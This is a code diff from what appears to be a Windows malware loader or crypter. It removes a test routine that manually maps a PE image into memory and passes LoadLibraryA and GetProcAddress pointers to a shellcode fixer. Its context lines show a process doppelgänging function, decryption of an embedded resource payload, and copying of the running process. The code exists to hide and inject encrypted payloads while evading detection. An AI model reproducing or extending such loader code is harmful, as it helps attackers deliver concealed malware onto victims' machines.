@@ -364,46 +364,6 @@ bool processDoppelganging(void* image, const char* currentFilePath) {
 	return true;
 }
 
-bool testShellCode(void* image) {
-
-	IMAGE_DOS_HEADER* DOSHeader; // For Nt DOS Header symbols
-	IMAGE_NT_HEADERS* NtHeader; // For Nt PE Header objects & symbols
-
-	DOSHeader = PIMAGE_DOS_HEADER(image); // Initialize Variable
-	NtHeader = PIMAGE_NT_HEADERS(MINT(image) + DOSHeader->e_lfanew); // Initialize
-
-	// Read instructions
-	//ReadProcessMemory(PI.hProcess, LPCVOID(CTX->Ebx + 8), LPVOID(&ImageBase), 4, 0);
-	void* pImageBase = malloc(NtHeader->OptionalHeader.SizeOfImage);
-
-	if (!pImageBase) {
-		PRINT_ERROR("Error allocating memory on target process");
-		return false;
-	}
-
-	// Write headers to process
-	memcpy(pImageBase, image, NtHeader->OptionalHeader.SizeOfHeaders);
-
-	//Write sections to process
-	for (int count = 0; count < NtHeader->FileHeader.NumberOfSections; count++) {
-		PIMAGE_SECTION_HEADER SectionHeader = PIMAGE_SECTION_HEADER(MINT(image) + DOSHeader->e_lfanew + sizeof(IMAGE_NT_HEADERS) + (count * sizeof(IMAGE_SECTION_HEADER)));
-
-		memcpy(LPVOID(MINT(pImageBase) + SectionHeader->VirtualAddress), LPVOID(MINT(image) + SectionHeader->PointerToRawData), SectionHeader->SizeOfRawData);
-
-	}
-
-	SHELLCODE_ARGUMENT ManualInject = { 0 };
-
-
-	ManualInject.ImageBase = pImageBase;
-	ManualInject.NtHeaders = (PIMAGE_NT_HEADERS)(MINT(pImageBase) + DOSHeader->e_lfanew);
-	ManualInject.fnLoadLibraryA = LoadLibraryA;
-	ManualInject.fnGetProcAddress = GetProcAddress;
-
-	PRINT_INFO("%d", shellCodeFixer(&ManualInject));
-}
-
-
 
 int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
 {
@@ -425,9 +385,6 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
 	PRINT_INFO("Resource with %d bytes",resourceBuffer.size());
 
 	encryptDecrypt(resourceBuffer);
-
-	/*testShellCode(resourceBuffer.data());
-	system("pause");*/
 
 	//Create a copy of this process
 	char currentFilePath[1024] = { 0 };
